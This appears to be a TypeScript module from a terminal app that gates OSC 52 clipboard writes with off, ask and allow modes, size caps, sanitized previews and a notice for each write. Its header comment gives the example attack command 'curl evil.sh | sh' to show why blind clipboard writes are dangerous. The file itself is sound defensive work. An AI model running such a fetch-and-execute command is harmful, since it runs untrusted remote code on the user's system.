// The gate in front of OSC 52 clipboard stores.
//
// Any program's output can carry `ESC ] 52 ; c ; <base64> BEL`: a `cat` of a
// hostile file, a curl response, text an agent echoes. Honoured blindly, it
// swaps what the user copied for something they will then paste (`curl
// evil.sh | sh`). The Rust pump therefore never writes the clipboard on its
// own; it forwards `term://clipboard` and this gate decides, per the
// `clipboardWrites` setting:
//
//   off    drop silently (debug log)
//   ask    the first store from a terminal asks. "Allow once" applies that
//          store only; "Allow" and "Deny" are remembered for that terminal
//          until it closes — except that a store of more than one line asks
//          again even from an allowed terminal, because pasting it into a
//          shell runs every line. One prompt per terminal at a time — stores
//          arriving while it is open are DROPPED, never queued: replaying
//          them later would apply text the user never saw.
//   allow  apply
//
// Every mode caps the payload, and every write that actually lands shows a
// brief notice, so a clipboard change is never invisible.
//
// The gate lives in the frontend because it is the only layer that can put a
// confirm in front of the user and that knows which rail row a terminal is.

import type { ClipboardWritesMode } from "./ipc";
import { visibleText } from "./visible";

/** Largest store applied, in decoded UTF-8 bytes. Mirrors the Rust pump's
 *  cap (`OSC52_MAX_BYTES`), which drops anything larger before it reaches the
 *  event bus; this is the same rule for any path that bypasses it. */
export const CLIPBOARD_MAX_BYTES = 100 * 1024;

/** How much of the text's start and end the confirm shows. */
export const PREVIEW_HEAD = 48;
export const PREVIEW_TAIL = 32;

/** UTF-8 byte length without allocating when the answer is obvious. */
export function utf8Length(text: string): number {
  // Every UTF-16 unit encodes to at most 3 bytes.
  if (text.length * 3 <= CLIPBOARD_MAX_BYTES) return text.length;
  return new TextEncoder().encode(text).length;
}

/** The confirm's preview: the whole text when it is short, else its first
 *  `head` and last `tail` characters around a count of what is not shown —
 *  the end of a store is where a payload hides behind harmless-looking
 *  text. Whitespace and control characters are made visible (a space as
 *  `␣`, a line break as `␊`; see visible.ts), so neither can pass for
 *  something else. */
export function previewText(text: string, head = PREVIEW_HEAD, tail = PREVIEW_TAIL): string {
  const chars = [...text];
  const show = (part: string[]): string => visibleText(part.join(""), { spaces: true });
  if (chars.length <= head + tail) return show(chars);
  const hidden = chars.length - head - tail;
  return `${show(chars.slice(0, head))} …(${hidden} more characters)… ${show(chars.slice(-tail))}`;
}

/** Whether `text` is more than one line once pasted. */
export function isMultiline(text: string): boolean {
  return /[\r\n\u0085\u2028\u2029]/.test(text);
}

/** The answer to one clipboard confirm. */
export type ClipboardAnswer = "deny" | "once" | "always";

export interface ClipboardGateDeps {
  /** The live `clipboardWrites` setting. */
  mode(): ClipboardWritesMode;
  /** Ask the user. `label` names the terminal by its row's own name,
   *  `preview` is already sanitized, `chars` is the full length, and
   *  `multiline` says the text has more than one line. */
  confirm(label: string, preview: string, chars: number, multiline: boolean): Promise<ClipboardAnswer>;
  /** Put the text on the OS clipboard. */
  write(text: string): Promise<void>;
  /** The brief non-blocking "<label> set the clipboard" notice. */
  notice(message: string): void;
  /** Debug logging; defaults to console.debug. */
  log?(message: string): void;
}

/** What one store came to. */
export type ClipboardOutcome = "applied" | "dropped";

export class ClipboardGate {
  private readonly decisions = new Map<number, "allowed" | "denied">();
  /** Terminals with a confirm on screen, keyed to a token so a terminal that
   *  closed (and whose id may be recycled) mid-prompt does not inherit the
   *  answer. */
  private readonly prompting = new Map<number, object>();
  private readonly log: (message: string) => void;

  constructor(private readonly deps: ClipboardGateDeps) {
    this.log = deps.log ?? ((m) => console.debug(m));
  }

  /** Handle one OSC 52 store from terminal `termId`, labelled `label` (the
   *  row's own name, never a title the program set: the prompt must say
   *  which terminal is asking in words the program cannot choose). */
  async handle(termId: number, label: string, text: string): Promise<ClipboardOutcome> {
    const bytes = utf8Length(text);
    if (bytes > CLIPBOARD_MAX_BYTES) {
      this.log(`[clipboard] ${label}: dropped a ${bytes}-byte write (cap ${CLIPBOARD_MAX_BYTES})`);
      return "dropped";
    }
    const mode = this.deps.mode();
    if (mode === "off") {
      this.log(`[clipboard] ${label}: write dropped (clipboard writes are off)`);
      return "dropped";
    }
    if (mode === "allow") return this.apply(label, text);

    const multiline = isMultiline(text);
    const decision = this.decisions.get(termId);
    if (decision === "allowed" && !multiline) return this.apply(label, text);
    if (decision === "denied") {
      this.log(`[clipboard] ${label}: write dropped (denied for this terminal)`);
      return "dropped";
    }
    if (this.prompting.has(termId)) {
      this.log(`[clipboard] ${label}: write dropped (a prompt is already open)`);
      return "dropped";
    }

    const token = {};
    this.prompting.set(termId, token);
    let answer: ClipboardAnswer = "deny";
    try {
      answer = await this.deps.confirm(label, previewText(text), [...text].length, multiline);
    } catch {
      answer = "deny";
    }
    const stillOurs = this.prompting.get(termId) === token;
    if (stillOurs) {
      this.prompting.delete(termId);
      if (answer === "always") this.decisions.set(termId, "allowed");
      else if (answer === "deny") this.decisions.set(termId, "denied");
    }
    if (answer === "deny") {
      this.log(`[clipboard] ${label}: write denied`);
      return "dropped";
    }
    // The setting may have been switched off while the prompt was open.
    if (this.deps.mode() === "off") return "dropped";
    return this.apply(label, text);
  }

  /** The terminal closed: forget its answer (ids can be recycled). */
  forget(termId: number): void {
    this.decisions.delete(termId);
    this.prompting.delete(termId);
  }

  private async apply(label: string, text: string): Promise<ClipboardOutcome> {
    try {
      await this.deps.write(text);
    } catch (e) {
      this.log(`[clipboard] ${label}: write failed: ${String(e)}`);
      return "dropped";
    }
    this.deps.notice(`${label} set the clipboard`);
    return "applied";
  }
}
